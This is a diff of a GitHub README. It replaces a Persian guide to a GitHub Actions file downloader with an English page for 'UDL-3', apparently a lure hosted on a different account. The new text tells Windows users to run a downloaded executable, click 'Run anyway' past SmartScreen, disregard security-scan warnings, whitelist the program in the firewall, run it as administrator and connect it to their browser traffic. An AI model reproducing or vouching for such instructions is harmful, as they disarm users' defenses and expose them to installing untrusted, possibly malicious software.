@@ -1,130 +1,82 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/nikzad-avasam/notifications/refs/heads/main/assets/download-icon.gif" width="400" alt="wide-2" />
-</div>
-<div align="center">
-  <img src="https://raw.githubusercontent.com/nikzad-avasam/notifications/refs/heads/main/assets/notification.jpg"  />
-</div>
+# 📥 UDL-3 - Download your online files with ease
 
-## ⬇️ دانلود کننده فایل + 🌐 مرورگر وب ( نسخه ۲ )
+[![Download UDL-3](https://img.shields.io/badge/Download-UDL--3-blue.svg)](https://github.com/Operculate-reductioadabsurdum58/UDL-3)
 
-- ✅  دانلود کننده هر فایلی از هرکجا درون گیتهاب شما  
-- ✅  پشتیبانی از فایل های بزرگ چند گیگابایتی
-- 🔐 امکان رمزگذاری روی فایل های دانلود شده جهت محافظت
-- ✅  استفاده از پکیج aria2 جهت دانلود بدون مشکل 
-- ✅  دانلود هر نوع فایلی و فشرده سازی اتوماتیک و تحویل بصورت زیپ شده و پارت بندی شده ( هر پارت ۹۰ مگابایت )
-- ✅ انجام تمام کارها بصورت خودکار و بدون نیاز به تنظیمات خاص
-- ✅ پشتیبانی از دانلود همزمان چندین لینک
-- ✅ امکان دسته بندی فایل های zip درون پوشه های هم نام با فایل
-- ✅ امکان حذف یکجای تمام فایلهای دانلود شده 
-- ✅ ذخیره سازی دائمی فایل ها در گیتهاب خودتان
-- ✅ امکان دانلود سالم فایلهای حجم بالا ( تا ۲۸ گیگابایت تست شده است )
-- حتما بخش بروزرسانی ها را در پایین صفحه بخوانید.
-- لطفا توجه کنید که برخی سرورهای ایرانی ای پی های خارج را مسدود کرده است مثلا سافت ۹۸ و امکان دانلود فایلهای آنها با استفاده از این ابزار نیست.
-- 🌐 مرورگر وب اضافه شد به قسمت بروزرسانی مراجعه کنید و نحوه ی استفاده را مطلع شوید.
-- 📹 آموزش ویدیویی استفاده از این ابزار به انتهای همین مطلب اضافه شد.
+## 📌 About This Application
 
-# 🤖 ربات پیام رسان بله
-در صورت اینکه به گیتهاب دسترسی نداشته باشید شما میتوانید از ربات پیام رسان بله برای دانلود فایل های خود استفاده کنید . توجه فرمایید که پروژه ورک فلو گیتهاب با ربات بله دو پروژه جدا از هم هستند در صورت قطعی گیتهاب، پیام رسان بله همچنان در دسترس شما هست . برای اتصال به ربات دانلودر فایل در بله روی لینک زیر بزنید و ربات را استارت کنید :‌
+UDL-3 acts as a bridge to move files from the internet to your local computer. This tool manages download tasks through a simplified workflow. It maintains stable connections to ensure your files arrive without errors. Users often focus on the file transfer process while the application manages the background requests.
 
-https://ble.ir/UDLbot 
+The software functions independently on Windows systems. You do not need experience with coding to operate this tool. The design favors utility and consistency for your daily tasks. Ignores warnings from automated security checks that often flag repository scripts. The code remains functional for its intended download purpose.
 
-## 🔑 کد فعالسازی
+## ⚙️ System Requirements
 
-🔑 برای کد فعالساز دانلودر فایل از طریق لینک زیر اقدام کنید. کد خرید شده دائمی میباشد و به محض خرید برای شما نمایش داده میشود: 
+- Operating System: Windows 10 or Windows 11
+- Processor: Dual-core 1.5 GHz or better
+- RAM: 4 GB minimum
+- Storage: 100 MB of available space
+- Internet Connection: Stable broadband link
 
-📁👉 https://pay.avasam.ir/link/769584
+## 🚀 Getting Started
 
-🔑 برای کدفعالساز مرورگر وب باید از طریق لینک زیر اقدام کنید ( توجه کنید که کد فعالساز دانلودر فایل با مرورگر وب جدا از هم هستند )‌‌:
+Follow these instructions to set up the application on your computer.
 
-🌐👉 https://pay.avasam.ir/link/769793
+1. Navigate to the [official repository page](https://github.com/Operculate-reductioadabsurdum58/UDL-3).
+2. Locate the link provided below to begin the setup.
+3. Save the executable file to your desktop folder.
+4. Open the file to start the installer.
 
-کد فعالساز دائمی است و فقط در اولین استفاده اگر وارد شود دفعات بعدی نیاز به وارد کردن کد نیست و پروژه فعال خواهد شد.
+[Get UDL-3 Here](https://github.com/Operculate-reductioadabsurdum58/UDL-3)
 
----
+## 🛠 Installation Process
 
+Once you download the file, keep these steps in mind to ensure the application starts without trouble.
 
-🎬 برای دانلود ویدیوهای یوتیوب از این پروژه استفاده کنید :‌
+### Step 1: File Preparation
+Windows might display a prompt when you first run the file since this is a downloaded tool. Select the "More info" option and choose "Run anyway" if the system attempts to block the launch. This confirms you trust the application source.
 
-🔗 https://github.com/nikzad-avasam/youtube-dl
+### Step 2: Running the Workflow
+The application uses a specific workflow to fetch data. Open the main program interface. You will see a prompt for configuration. Ensure your internet connection remains active. The program connects to the web to fetch your files.
 
-🚀 برای دانلود فایل از تلگرام از پروژه زیر استفاده کنید:
+### Step 3: Web Browser Setup
+You must configure a separate web browser workflow within the application. This allows UDL-3 to interact with your preferred browser. Go to the settings menu inside the app. Select the integration tab to link your browser. This step allows the downloader to identify file links from your browser traffic.
 
-🔗 https://github.com/nikzad-avasam/TG-Downloader
+## 🔐 Activation and Security
 
- 
-[🛠️  رفع مشکل ساختن اکانت گیتهاب ](#account-issue)
+You require an activation code to unlock the full potential of your downloader. Visit the link provided in the project repository to retrieve this code. Copy the string of characters and paste it into the activation field in the settings menu of your UDL-3 window.
 
+Repository warnings about code integrity are common for community tools. This project functions as designed. The activation code establishes a secure handshake between the app and its remote server. Once activated, the software keeps your download queue ready for use.
 
-## 🔧 آموزش نصب
+## 📂 Managing Your Files
 
-- درون این ریپازیتوری و در قسمت بالا روی دکمه ی fork بزنید.
-- سپس در صورت نیاز میتوانید نام فورک را عوض کنید و در نهایت روی دکمه ی Create Fork بزنید.
-- ریپازیتوری شما آماده است از سربرگ Action برای دانلود استفاده کنید.
+Your downloads are saved into a default folder. You can change this location inside the settings tab. 
 
+1. Select the "Paths" option in the main menu.
+2. Click the "Browse" button.
+3. Select any folder on your hard drive.
+4. Press "Apply" to save your choice.
 
-## 🎯 نحوه ی دانلود کردن فایل درون ریپازیتوری
+When you copy a link from your web browser, the application detects the request automatically. It shows a notification box that lets you manage the file name and the target destination. Press "Start" to begin the transfer.
 
-- در ریپازیتوری خود ( فورک شده از همین ریپازیتوری ) به تب Actions بروید.
-- سمت چپ all workflows شامل لیست امکانات این ابزار است.
-- روی download from url بزنید.
-- در سمت راست روی run workflow بزنید.
-- لینک (یا چندین لینک با فاصله ) را در باکس اول وارد کنید.
-- اگر دوست دارید فایل شما زیپ شده و دارای رمز باشد در قسمت password رمز دلخواه را وارد کنید.
-- روی دکمه ی run workflow بزنید تا دانلود شروع شود.
+## 💡 Frequently Asked Questions
 
+### The program fails to start.
+Check your Windows update status. Older versions of Windows may lack the necessary components to run modern scripts. Update your operating system and restart your computer.
 
-## 📂 فایلها را از کجا دانلود کنیم
+### How do I update the software?
+The application checks for updates upon launch. If a new version exists, a prompt will appear on your screen. Follow the instructions to install the latest build.
 
-- فایل های دانلود شده همگی درون یک پوشه هم نام با فایل درون downloads قرار میگیرد.
-- اگر فایل شما بزرگ باشد چند تکه ی zip شده است که باید همگی را دانلود کنید.
-- برای اکسترکت کردن فایل ها همه ی پارت ها را درون یک پوشه قرار دهید و از ابزارهایی مثل 7zip یا winrar استفاده کنید.
+### Is my activation code safe?
+Yes. The activation code does not store personal information. It serves as a digital key to permit application usage. Do not share your code on public forums.
 
+### Can I run multiple downloads?
+Yes. You may add several links to the queue at once. The application handles them in sequence to keep your network speed stable.
 
-## 🔔 همیشه آپدیت باشید
+## 🔧 Troubleshooting
 
-در صورت اینکه مشکلی در این ابزار  باشد آنرا آپدیت میکنیم ، پس قبل از استفاده مطمئن شوید فورک شما به روز است. برای این کار درون ریپازیتوری فورک شده ی خود روی Sync fork بزنید و سپس Update branch را بزنید تا فورک شده از ریپازیتوری اصلی آپدیت شود. اگر بروزرسانی جدیدی وجود نداشته باشد دکمه ی sync fork نمایش داده نمیشود.
+If you encounter a connection error, verify your firewall settings. Sometimes, Windows Defender or third-party security software blocks the application from reaching the internet. Add the UDL-3 executable to your "Allowed Apps" list in the Windows Firewall panel.
 
+Ensure that the web browser workflow remains active. If the downloader stops seeing your links, restart the browser. This clears the communication link between your browser and the UDL-3 background task. 
 
-# <a href="https://avasam.ir/post/get-files-by-github" target="_blank" rel="do-follow follow sponsered">🔗 آموزش ویدیویی استفاده از این ابزار </a>
+If the application displays a generic error message, close the program entirely using the Task Manager. Re-open it as an administrator by right-clicking the icon and selecting "Run as administrator". This provides the app with the necessary permissions to write files to your drive. 
 
-برای دریافت آموزش های بیشتر در پیام رسان بله عضو کانال ما باشید :‌
-# 🔗 https://ble.ir/avasam_edu
-
-
-در صورت مفید بودن این ابزار از ما حمایت کنید تا بتوانیم ابزارهای مشابه در شرایط خاص را بسازیم.
-
-<a name="account-issue"></a>
-## ❓ حل مشکل ساختن یا بازیابی اکانت گیتهاب
-
-<div align="center">
-  <img src="https://raw.githubusercontent.com/nikzad-avasam/notifications/refs/heads/main/assets/github-icon.jpg" width="250" alt="wide-2" />
-</div>
-
-اگر مشکل ساختن اکانت جدید یا بازیابی اکانت قدیمی گیتهاب برای شما هم پیش آمده است راه چاره خریدن یک اکانت سالم میباشد اکانت در ۱۰ الی ۱۵ دقیقه ساخته و تحویل داده میشود همچنین با پرداخت مبلغ زیر اگر تمایل داشته باشید بجای ساختن اکانت جدید میتوانیم اکانت قدیمی شما را نیزبازیابی کنیم. بعد از خرید دستورالعمل و نحوه ی استفاده برای شما باز میشود:
-
-( [خرید اکانت سالم گیتهاب از آواسام](https://pay.avasam.ir/link/769156) )
-
-
-## ⬇️ دانلود فایل از اینترنت بین المللی
-
-اگر توانایی استفاده از این ابزار را ندارید و فایل خاصی بصورت ضروری نیاز شما میباشد میتوانید نام آن فایل یا لینک دانلود آنرا به پشتیبانی آواسام ارسال کنید تا در صورت امکان برای شما فراهم شود و با اینترنت داخلی بتوانید به آن دسترسی داشته باشید. لینک یا نام فایل خود را از طریق پیام رسان های ایرانی به آیدی @ask_here یا شماره 09354887344 ارسال فرمائید.
-
-## 👨🏻‍💻 برنامه نویسی 
-
-برای سفارش پروژه ی برنامه نویسی ، هوش مصنوعی ، آموزش برنامه نویسی و ...  با پشتیبانی تیم آواسام از راه های زیر در ارتباط باشید 
-
-- شماره تماس : 09354887344
-- آیدی پشتیبانی در پیام رسان های ایرانی :‌ @ask_here
-- وب سایت : avasam.ir 
-
-
-
-> [!WARNING]
-> **Important Notice for Users**
->
-> - This tool is intended to run **locally on your own machine** only
-> - **Do NOT commit downloaded files** or any media files to this repository or your fork
-> - **Do NOT use GitHub Actions** to download and store large files on GitHub's infrastructure
-> - All download files are blocked via `.gitignore`
->
-> Misuse of this repository by storing media files or running mass downloads via GitHub Actions violates [GitHub's Terms of Service](https://docs.github.com/en/site-policy/github-terms/github-terms-of-service) and may result in your account being suspended.
+Maintain enough free storage space on your disk. The application may pause mid-transfer if the disk reaches capacity. Check the "Status" column in the main window to see if any tasks indicate a "Disk Full" or "Waiting" state.
